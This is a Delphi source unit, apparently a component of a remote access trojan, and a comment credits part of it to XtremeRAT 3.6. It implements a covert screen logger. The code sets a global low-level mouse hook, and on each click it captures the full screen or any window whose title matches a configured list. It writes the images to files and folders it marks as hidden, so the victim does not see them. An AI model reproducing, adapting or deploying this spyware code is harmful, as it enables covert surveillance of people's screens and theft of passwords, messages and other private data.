unit UnitScreenlogger;

interface

uses
  Windows, UnitCaptureFunctions, UnitFunctions, UnitConfiguration, UnitVariables,
  Messages, StreamUnit;

procedure StartScreenlogger;
procedure StopScreenlogger;

implementation
       
var
  ActiveScreenlogger: Boolean;
  kHook_mouse: Cardinal = 0;
  TimerHandle: Word;

function CheckScreenlogsDir: string;
begin
  if not DirectoryExists(ScreenlogsPath) then
  begin
    CreateDirectory(PChar(ScreenlogsPath), nil);
    HideFileName(ScreenlogsPath);
  end;

  Result := ScreenlogsPath + '\' + MyGetMonth;
  if not DirectoryExists(Result) then
  begin
    CreateDirectory(PChar(Result), nil);
    HideFileName(Result);
  end;
end;

function CheckWindowTitle(wTitle: string): Boolean;
var
  TmpStr, TmpStr1: string;
begin
  Result := False;
  TmpStr := _Windows;

  while Pos(',', TmpStr) > 0 do
  begin
    TmpStr1 := Copy(TmpStr, 1, Pos(',', TmpStr) - 1);
    Delete(TmpStr, 1, Pos(',', TmpStr));
    if Pos(UpperString(TmpStr1), UpperString(wTitle)) > 0 then
    begin
      Result := True;
      Break;
    end;
  end;
end;

procedure LogScreen;
var
  TmpStream, Stream: TMemoryStream;
  TmpStr, LogDir, hCaption, LogFile: string;
  hdle: HWND;
begin
  LogDir := CheckScreenlogsDir;
  hCaption := ActiveCaption;

  if _Windows = '' then
  begin
    TmpStream := TMemoryStream.Create;
    SaveBitmapToStream(TmpStream, GetBitmapFromWindow(0));
    TmpStream.Position := 0;

    Stream := TMemoryStream.Create;
    SaveAndScaleScreen(100, 0, 0, TmpStream, Stream);
    Stream.Position := 0;
    TmpStream.Free;
    
    SetLength(TmpStr, Stream.Size);
    Stream.Read(Pointer(TmpStr)^, Length(TmpStr));
    Stream.Free;
    
    LogFile := LogDir + '\' + MyGetDate('-') + '^' + MyGetTime2('_');
  end
  else
  begin
    if not CheckWindowTitle(hCaption) then Exit;

    hdle := FindWindow(nil, PChar(hCaption));
    TmpStream := TMemoryStream.Create;
    SaveBitmapToStream(TmpStream, GetBitmapFromWindow(hdle));
    TmpStream.Position := 0;

    Stream := TMemoryStream.Create;
    SaveAndScaleScreen(100, 0, 0, TmpStream, Stream);
    Stream.Position := 0;
    TmpStream.Free;
                                                        
    SetLength(TmpStr, Stream.Size);
    Stream.Read(Pointer(TmpStr)^, Length(TmpStr));
    Stream.Free;

    LogFile := LogDir + '\' + hCaption + '_[' + MyGetDate('-') + '^' + MyGetTime2('_') + ']';
  end;

  MyCreateFile(LogFile, TmpStr, Length(TmpStr));
  SetFileAttributes(PChar(LogFile), FILE_ATTRIBUTE_HIDDEN);
end;

//From XtremeRAT 3.6 source code
//-----
function LowLevelKeybdHookProc_mouse(nCode, wParam, lParam : Integer) : Integer; stdcall;
begin
  if (wParam = WM_LBUTTONDOWN) or (wParam = WM_RBUTTONDOWN) or
    (wParam = WM_MBUTTONDOWN) or (wParam = WM_LBUTTONDBLCLK) or
    (wParam = WM_RBUTTONDBLCLK)
  then LogScreen;

  Result := CallNextHookEx(kHook_mouse, nCode, wParam, lParam);
end;

procedure StartMouseLogger;
begin
  if kHook_mouse <> 0 then UnhookWindowsHookEx(kHook_mouse);
  kHook_mouse := SetWindowsHookExW(14, @LowLevelKeybdHookProc_mouse, GetModuleHandle(0), 0);
end;

procedure StopMouseLogger;
begin
  if kHook_mouse <> 0 then UnhookWindowsHookEx(kHook_mouse);
  kHook_mouse := 0;
end;
//-----

procedure StartScreenlogger;
begin
  CheckScreenlogsDir;
  StartMouseLogger;
end;

procedure StopScreenlogger;
begin
  StopMouseLogger;
end;

end.
